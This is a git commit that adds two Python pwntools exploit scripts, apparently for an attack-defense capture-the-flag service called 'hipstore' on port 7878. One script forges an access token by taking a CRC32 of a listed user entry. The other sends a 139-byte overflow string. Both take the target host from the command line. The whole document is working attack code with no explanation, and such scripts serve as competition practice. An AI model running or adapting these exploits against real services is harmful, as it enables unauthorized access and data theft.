c193fb8553aea461912fcb8bbf9550783556ef68
pres1er <knnikita@yandex.ru>
2019-03-07 00:16:19 +0300

    Add files via upload

---
+++ sploits/hipstore.get_token.py
@@ -0,0 +1,27 @@
+#!/usr/bin/python
+
+from pwn import *
+from binascii import crc32
+import sys
+
+r = remote(sys.argv[1], 7878)
+
+r.recv()
+r.sendline("3")
+list_users = r.recvuntil("Choose")
+
+l = list_users.split('\n')
+
+
+tokens = l
+
+r.recv()
+r.sendline('4')
+r.recv()
+r.sendline(hex(crc32(str(tokens[len(tokens) - 2])))[2:])
+print r.recvuntil("ew")
+print r.recv()
+ 
+# flag = r.recv()
+# 
+# print flag
---
+++ sploits/hipstore.heap_overflow.py
@@ -0,0 +1,21 @@
+#!/usr/bin/python
+
+from pwn import *
+import sys
+
+# r = remote("localhost", 7878)
+r = remote(sys.argv[1], 7878)
+
+r.recv()
+r.sendline('1')
+r.recv()
+r.sendline('qweasdzxc')
+r.recv()
+r.sendline('A' * 139)
+r.recv()
+r.sendline('2')
+r.recv()
+r.sendline('9')
+#r.interactive()
+res = r.recvuntil('=')
+print res
